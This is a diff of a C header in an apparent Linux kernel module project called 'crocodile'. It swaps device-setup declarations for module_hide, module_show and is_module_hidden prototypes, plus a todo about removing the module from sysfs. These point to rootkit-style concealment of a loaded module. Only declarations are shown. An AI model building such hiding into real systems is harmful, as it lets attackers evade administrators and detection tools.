@@ -16,15 +16,19 @@
  * along with this program.  If not, see <http://www.gnu.org/licenses/>.
  */
 
-#ifndef _CROCODILE_LKM_DEVICE_DEVICE_UTILS_H_
-#define _CROCODILE_LKM_DEVICE_DEVICE_UTILS_H_
+#ifndef _CROCODILE_LKM_CTRL_IOCTL_MODULE_H_
+#define _CROCODILE_LKM_CTRL_IOCTL_MODULE_H_
 
-#include "types.h"
+/*
+ * @todo    Implement restore and remove the LKM from sysfs.
+ *          https://stackoverflow.com/questions/46502395/restore-or-remove-the-linux-kernel-module-from-sysfs
+ */
 
-void cdev_setup(module_dev_t* p_dev, int major, int minor, int idx, 
-                struct file_operations* p_fops);
+int is_module_hidden(void);
 
-int cdev_trim(module_dev_t* p_dev);
+void module_hide(void);
 
-#endif /* _CROCODILE_LKM_DEVICE_DEVICE_UTILS_H_ */
+void module_show(void);
+
+#endif /* _CROCODILE_LKM_CTRL_IOCTL_MODULE_H_ */
 
